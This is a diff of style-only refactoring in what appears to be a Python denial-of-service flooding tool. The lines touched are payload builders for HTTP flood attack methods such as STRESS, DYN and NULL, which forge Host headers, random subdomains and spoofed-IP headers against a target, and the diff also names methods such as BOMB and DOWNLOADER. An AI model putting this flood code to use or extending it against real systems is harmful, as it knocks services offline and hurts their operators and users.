@@ -159,7 +159,7 @@ class Tools:
             suffix = MULTIPLES[multiple].format("i" if binary else "")
             return f"{value:.{precision}f} {suffix}"
         else:
-            return f"-- B"
+            return "-- B"
 
     @staticmethod
     def humanformat(num: int, precision: int = 2):
@@ -660,7 +660,7 @@ class HttpFlood(Thread):
 
     def generate_payload(self, other: str = None) -> bytes:
         return str.encode((self._payload +
-                           "Host: %s\r\n" % self._target.authority +
+                           f"Host: {self._target.authority}\r\n" +
                            self.randHeadercontent +
                            (other if other else "") +
                            "\r\n"))
@@ -712,7 +712,7 @@ class HttpFlood(Thread):
 
     def STRESS(self) -> None:
         payload: bytes = self.generate_payload(
-            (f"Content-Length: 524\r\n"
+            ("Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
              '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
@@ -897,7 +897,7 @@ class HttpFlood(Thread):
 
     def DYN(self):
         payload: Any = str.encode(self._payload +
-                                          "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority) +
+                                          f"Host: {ProxyTools.Random.rand_str(6)}.{self._target.authority}\r\n" +
                                           self.randHeadercontent +
                                           "\r\n")
         s = None
@@ -966,7 +966,7 @@ class HttpFlood(Thread):
 
     def NULL(self) -> None:
         payload: Any = str.encode(self._payload +
-                                          "Host: %s\r\n" % self._target.authority +
+                                          f"Host: {self._target.authority}\r\n" +
                                           "User-Agent: null\r\n" +
                                           "Referrer: null\r\n" +
                                           self.SpoofIP + "\r\n")
@@ -1055,7 +1055,7 @@ class HttpFlood(Thread):
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
                     self._defaultpayload +
-                    "Host: %s\r\n\r\n" % self._target.authority).encode()
+                    f"Host: {self._target.authority}\r\n\r\n").encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
@@ -1355,7 +1355,7 @@ class ToolsConsole:
     # noinspection PyUnreachableCode
     @staticmethod
     def info(domain):
-        with suppress(Exception), get("https://ipwhois.app/json/%s/" % domain) as s:
+        with suppress(Exception), get(f"https://ipwhois.app/json/{domain}/") as s:
             return s.json()
         return {"success": False}
 
